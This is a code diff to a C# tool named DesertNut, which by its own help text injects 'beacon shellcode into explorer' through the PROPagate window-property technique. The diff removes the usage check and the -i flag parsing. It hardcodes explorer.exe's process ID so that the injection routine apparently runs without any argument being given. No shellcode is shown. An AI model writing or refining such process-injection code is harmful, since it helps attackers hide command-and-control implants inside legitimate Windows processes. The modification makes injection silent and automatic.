@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using Console = Colorful.Console;
@@ -6,6 +6,7 @@ using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Reflection;
 using System.IO;
+using System.Diagnostics;
 
 namespace DesertNut
 {
@@ -178,16 +179,12 @@ namespace DesertNut
             // Banner
             DesertNut_h.PrintBanner();
 
-            if (args.Length == 0)
-            {
-                Console.WriteLine("[!] No arguments given..", Color.Red);
-                Console.WriteLine("    => -l(--ListSubclassWndProps)    List potentially injectable properties.", Color.LightGreen);
-                Console.WriteLine("    => -i(--Inject)                  Inject beacon shellcode into explorer.", Color.LightGreen);
-            }
-            else
-            {
-                int ListSubclassWndProp = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(l|ListSubclassWndProps)$").Match(s).Success);
-                int PROPagate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
+           int ListSubclassWndProp = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(l|ListSubclassWndProps)$").Match(s).Success);
+                //int PROPagate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
+                Process[] explorerPid = Process.GetProcessesByName("explorer");
+                Process EntryOne = explorerPid[0];
+                int PROPagate = EntryOne.Id;
+
                 if (ListSubclassWndProp != -1)
                 {
                     List<DesertNut_h.WndPropStruc> CallResult =  DesertNut_h.EnumSubClassProps(true);
@@ -200,7 +197,7 @@ namespace DesertNut
                 {
                     PROPPagate();
                 }
-            }
+            
         }
     }
 }
